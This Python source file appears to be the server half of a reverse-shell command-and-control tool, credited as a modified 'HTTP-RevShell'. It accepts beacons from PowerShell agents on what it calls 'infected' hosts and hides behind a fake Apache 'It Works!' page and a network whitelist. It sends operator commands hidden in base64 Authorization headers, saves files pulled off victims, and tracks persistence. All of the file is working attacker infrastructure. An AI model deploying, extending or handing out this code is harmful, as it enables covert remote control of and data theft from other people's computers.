#!/usr/bin/python3
import threading
import globals, certificate, modulescontroller
from Color import Color
from http.server import BaseHTTPRequestHandler, HTTPServer
import readline, base64, urllib.parse, time, ssl, argparse, json, ipaddress, datetime
from os import listdir, sep, path

allowed_net = ipaddress.ip_network('78.157.129.0/24')
priv_net = list(allowed_net.hosts())
bypass = False
agents = {}
agentsdate = {}
agentspersist = {}
agent = ""
background = False
supercommand = ""
agentsid = 0
class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        client = ipaddress.ip_address(self.client_address[0])
        if (client in priv_net) or (bypass == True):
            self.server_version = "Apache/2.4.18"
            self.sys_version = "(Ubuntu)"
            self.send_response(200)
            self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        else:
            self.send_response(404)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes("<html><head><title>Status 404</title></head>", "utf-8"))
            self.wfile.write(bytes("<body><p>File not found</p>", "utf-8"))
            self.wfile.write(bytes("</body></html>", "utf-8"))
        return

    def do_POST(self):
        client = ipaddress.ip_address(self.client_address[0])
        if (client in priv_net) or (bypass == True):
            self.server_version = "Apache/2.4.18"
            self.sys_version = "(Ubuntu)"
            self.send_response(200)
            html = "<html><body><h1>It Works!</h1></body></html>"
            result, parser_type, json_response, color = self.parseResult()
            pwd = self.getPwd(json_response)
            user = self.getUser(json_response)
            hostname = self.getHostName(json_response)
            userhost = "{}@{}".format(user,hostname)
            lock = threading.Lock()
            global agentsid
            lock.acquire()
            global agents
            if not userhost in agents.values():
                agentsid += 1
                agents[str(agentsid)] = userhost
                if not userhost in agentspersist.keys():
                    agentspersist[userhost] = False
            lock.release()
            datenow = datetime.datetime.now()
            global agentsdate
            agentsdate[userhost] = datenow
            if (self.isDownloadFunctCalled(json_response)):
                filename, content, output = self.parseDownload(json_response)
                try:
                    with open(filename, mode='wb') as file: # b is importante -> binary
                        content = base64.b64decode(content)
                        file.write(content)
                        print(Color.F_Green + output + Color.reset)
                except:
                    print (Color.F_Red + "\r\n[!] Error: Writing file!" + Color.reset)
            else:
                if json_response["result"] != json_response["pwd"] and json_response["type"] != "4UT0C0MPL3T3":
                    self.printResult(result, "F_" + color.capitalize(), userhost)
            try:
                if userhost == agent:
                    global supercommand
                    if supercommand == "":
                        command = self.newCommand(pwd,user,hostname)
                    else:
                        command = supercommand
                    self.sendCommand(command, html)
                    supercommand = ""
            except (AttributeError, BrokenPipeError) as e:
                print (e)
        else:
            self.send_response(404)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes("<html><head><title>Status 404</title></head>", "utf-8"))
            self.wfile.write(bytes("<body><p>File not found</p>", "utf-8"))
            self.wfile.write(bytes("</body></html>", "utf-8"))
        return

    def parseResult(self):
        test_data = self.rfile.read(int(self.headers['Content-Length']))
        data = json.loads(test_data.decode('utf-8'))
        parser_type = data["type"]
        result = ""
        color = "white"

        if parser_type != "newclient":
            try:
                if (parser_type == "C0MM4ND"):
                    color = "white"
                elif (parser_type == "3RR0R"):
                    color = "red"
                else:
                    color = "green"

                if (parser_type == "4UT0C0MPL3T3"):
                    globals.PSH_FUNCTIONS = (base64.b64decode(data["result"])).decode('utf-8').split()
                    readline.set_completer(self.completer)
                    readline.set_completer_delims(" ")
                    readline.parse_and_bind("tab: complete")

                else:
                    result = urllib.parse.unquote(data["result"])
                    result = (base64.b64decode(data["result"])).decode('utf-8')
            except:
                pass
        else:
            src_ip, src_port = self.client_address
            print(Color.F_Red + "\n[!] New Connection from IP {} port {} ".format(src_ip, src_port) + Color.reset)
        return result, parser_type, data, color

    def parseDownload(self, json_result):
        downloaded_file_path = ""
        output = ""
        file_content = ""

        try:
            output = json_result["result"]
            downloaded_file_path = json_result["pathDst"]
            file_content = json_result["file"]
        except KeyError:
            pass

        return downloaded_file_path, file_content, output

    def getPwd(self, json_response):
        try:
            if json_response["pwd"]:
                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
                pwd = pwd_decoded.decode('utf-8').strip()
        except KeyError:
            pwd_decoded = base64.b64decode(json_response["result"].encode())
            pwd = pwd_decoded.decode('utf-8').strip()
        return pwd

    def getUser(self, json_response):
        try:
            if json_response["cuser"]:
                cuser_decoded = base64.b64decode(json_response["cuser"].encode())
                cuser = cuser_decoded.decode('utf-8').strip()
                return cuser
            else:
                return "Unknown"
        except:
           return "Unknown"

    def getHostName(self, json_response):
        try:
            if json_response["hostname"]:
                host_decoded = base64.b64decode(json_response["hostname"].encode())
                host = host_decoded.decode('utf-8').strip()
                return host
            else:
                return "Unknown"
        except:
            return "Unknown"

    def printResult(self, result, color, userhost):
        if userhost == agent:
            print(getattr(Color, color) + result + Color.reset)

    def isDownloadFunctCalled(self, json_response):
        iscalled = False
        try:
            if (json_response["type"] == "D0WNL04D" and json_response["file"]):
                iscalled = True
        except KeyError:
            pass
        return iscalled

    def newCommand(self, pwd, user, hostname):
        if globals.AUTOCOMPLETE:
            command = "autocomplete"
            globals.AUTOCOMPLETE = False
        elif pwd != "":
            #readline.parse_and_bind("tab: complete")
            command = input(Color.F_Red+ "{}@{}".format(user,hostname) + Color.reset + Color.F_Blue + " PS {}> ".format(pwd) + Color.reset)
            if command == "bg" or command == "exit":
                global background
                background = True
                global agent
                agent = ""
            if command == "":
                command = "pwd | Format-Table -HideTableHeaders"
        else:
            command = "pwd | Format-Table -HideTableHeaders"
        return command

    def sendCommand(self, command, html, content=""):
        if (command != ""):
            command_list = command.split(" ")
            if command_list[0] in globals.MODULES.keys():
                html = modulescontroller.ModulesController(globals.MODULES,command_list, command)
                html = str(html)

            CMD = base64.b64encode(command.encode())
            self.send_header('Authorization',CMD.decode('utf-8'))
            self.end_headers()
            self.wfile.write(html.encode())
            
    def completer(self,text, state):
        options = [i for i in globals.PSH_FUNCTIONS if i.startswith(text)]
        if state < len(options):
            return options[state]
        else:
            return None

def getidfromhost(host):
    for agentid, userhost in agents.items():
        if userhost == host:
            return agentid

    return auxid

def listagents():
    print("\nList of user@hosts infected")
    print(" - ID / USER@HOST / LAST CONNECTION / STATUS / PERSISTENT")
    current_date = datetime.datetime.now()
    for agentid, userhost in agents.items():
        agentdate = agentsdate[userhost]
        check = current_date-agentdate
        if check > datetime.timedelta(minutes=1):
            status = "Disconnected"
            Colorprint = Color.F_Red
        else:
            status = "Connected"
            Colorprint = Color.F_Green
        print(Colorprint + " - " + str(agentid) + " / " + userhost + " / " + str(agentdate) + " / " + status + " / " + str(agentspersist[userhost]) + Color.reset)
    print("")

def persistenceagents(action):
    global agentspersist
    if not action.split(" ")[2] in agents.values() and not action.split(" ")[2] in agents.keys():
        host = input(Color.F_Blue + "Choose the user@host or ID you want to mark as persist: " + Color.reset)
        if not host in agents.values() and not host in agents.keys():
            print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
        else:
            if host in agents.values():
                if action.split(" ")[1] == "add":
                    agentspersist[host] = True
                elif action.split(" ")[1] == "del":
                    agentspersist[host] = False
                else:
                    print(Color.F_Red + "Please set add or del in command" + Color.reset)
            else:
                if action.split(" ")[1] == "add":
                    agentspersist[agents[host]] = True
                elif action.split(" ")[1] == "del":
                    agentspersist[host] = False
                else:
                    print(Color.F_Red + "Please set add or del in command" + Color.reset)
    else:
        if action.split(" ")[2] in agents.values():
            if action.split(" ")[1] == "add":
                agentspersist[action.split(" ")[2]] = True
            elif action.split(" ")[1] == "del":
                agentspersist[action.split(" ")[2]] = False
            else:
                print(Color.F_Red + "Please set add or del in command" + Color.reset)
        else:
            if action.split(" ")[1] == "add":
                agentspersist[agents[action.split(" ")[2]]] = True
            elif action.split(" ")[1] == "del":
                agentspersist[agents[action.split(" ")[2]]] = False
            else:
                print(Color.F_Red + "Please set add or del in command" + Color.reset)
    listagents()


def cleanagents(action):
    global agents
    if action.split(" ")[1] == "all":
        print("Cleaning all agents from the list")
        agents = {}
    else:
        if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
            host = input(Color.F_Blue + "Choose the user@host or ID you want to clean from list: " + Color.reset)
            if not host in agents.values() and not host in agents.keys():
                print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
            else:
                if host in agents.values():
                    agentidaux = getidfromhost(host)
                else:
                    agentidaux = host
                del agents[agentidaux]
        else:
            if action.split(" ")[1] in agents.values():
                agentidaux = getidfromhost(action.split(" ")[1])
            else:
                agentidaux = action.split(" ")[1]
            del agents[agentidaux]
    listagents()

def disconnectagents(action):
    global supercommand
    global agents
    global agent
    supercommand = "exit"
    if action.split(" ")[1] == "all":
        print("Disconnecting all agents from the list")
        for host in agents.values():
            agent = host
    else:
        if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
            host = input(Color.F_Blue + "Choose the user@host or ID you want to disconnect from list: " + Color.reset)
            if not host in agents.values() and not host in agents.keys():
                print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
            else:
                if host in agents.values():
                    agent = host
                else:
                    agent = agents[host]
        else:
            if action.split(" ")[1] in agents.values():
                agent = action.split(" ")[1]
            else:
                agent = agents[action.split(" ")[1]]
    time.sleep(2)
    cleanagents(action)
def interactagents(action):
    global agent
    notagent = False
    if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
        host = input(Color.F_Blue + "Choose the user@host or ID you want to receive the shell: " + Color.reset)
        if not host in agents.values() and not host in agents.keys():
            print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
            notagent = True
        else:
            if host in agents.values():
                agent = host
            else:
                agent = agents[host]
    else:
        if action.split(" ")[1] in agents.values():
            agent = action.split(" ")[1]
        else:
            agent = agents[action.split(" ")[1]]
    if notagent == False:
        while True:
            try:
                if background == True:
                    break
                current_date = datetime.datetime.now()
                if not agent == "":
                    agentdate = agentsdate[agent]
                    check = current_date-agentdate
                    if check > datetime.timedelta(minutes=1):
                        print("")
                        print(Color.F_Red + "Agent disconnected" + Color.reset)
                        print("")
                        break
            except KeyboardInterrupt:
                break

def printmenu():
    print("""
Select from the menu:
    1) List
    2) Interact <userhost or ID>
    3) Clean <userhost or ID/all> (Remove the agent from the agent list)
    4) Disconnect <userhost or ID/all> (Disconnect the agent and remove from list)
    5) Persistence <add or del> <userhost or ID> (Only mark if persistence have been done on host)
    6) Help (Print this message)
    7) Exit
""")

def main():

    #banner = """
#Done By: Internon
#Thanks to: 3v4Si0N
    #"""
    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                By: 3v4Si0N     Modified By: Internon
    """
    print (Color.F_Yellow + banner + Color.reset)
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    parser.add_argument('--autocomplete', default=False, action="store_true", help='Autocomplete powershell functions')
    parser.add_argument('--bypass', default=False, action="store_true", help='Bypass the whitelist and receive agents from any network')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
        globals.initialize()

        if (args.ssl):
            cert = certificate.Certificate()
            if ((cert.checkCertPath() == False) or cert.checkCertificateExpiration()):
                cert.genCertificate()
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        if (args.autocomplete):
            globals.AUTOCOMPLETE = True
        else:
            readline.set_completer_delims(" ")
            readline.parse_and_bind("tab: complete")
        if (args.bypass):
            global bypass
            bypass = args.bypass
        global agents
        global agent
        global supercommand
        server_thread = threading.Thread(target=server.serve_forever)
        # Exit the server thread when the main thread terminates
        server_thread.daemon = True
        server_thread.start()
        printmenu()
        while True:
            global background
            background = False
            action = input(Color.F_Blue + "Choose your action from menu: " + Color.reset)
            if action.split(" ")[0] == "list" or action.split(" ")[0] == "List" or action.split(" ")[0] == "1":
                time.sleep(1)
                listagents()
            if action.split(" ")[0] == "interact" or action.split(" ")[0] == "Interact" or action.split(" ")[0] == "2":
                if not len(action.split(" ")) == 2:
                    print(Color.F_Red + "Wrong interact command syntax, please check help" + Color.reset)
                    printmenu()
                else:
                    interactagents(action)
            if action.split(" ")[0] == "clean" or action.split(" ")[0] == "Clean" or action.split(" ")[0] == "3":
                if not len(action.split(" ")) == 2:
                    print(Color.F_Red + "Wrong clean command syntax, please check help" + Color.reset)
                    printmenu()
                else:
                    cleanagents(action)

            if action.split(" ")[0] == "Disconnect" or action.split(" ")[0] == "disconnect" or action.split(" ")[0] == "4":
                if not len(action.split(" ")) == 2:
                    print(Color.F_Red + "Wrong clean command syntax, please check help" + Color.reset)
                    printmenu()
                else:
                    disconnectagents(action)
            if action.split(" ")[0] == "persistence" or action.split(" ")[0] == "Persistence" or action.split(" ")[0] == "5":
                if not len(action.split(" ")) == 3:
                    print(Color.F_Red + "Wrong clean command syntax, please check help" + Color.reset)
                    printmenu()
                else:
                    persistenceagents(action)
            if action.split(" ")[0] == "help" or action.split(" ")[0] == "Help" or action.split(" ")[0] == "6":
                printmenu()
            if action.split(" ")[0] == "exit" or action.split(" ")[0] == "Exit" or action.split(" ")[0] == "7":
                server.socket.close()
                print(Color.reset)
                break
                
    except KeyboardInterrupt:
        print("")
        print(Color.F_Red + "Pressed KeyboardInterrupt:" + Color.reset)
        print ('Received, shutting down the web server')
        server.socket.close()
        print(Color.reset)

main()
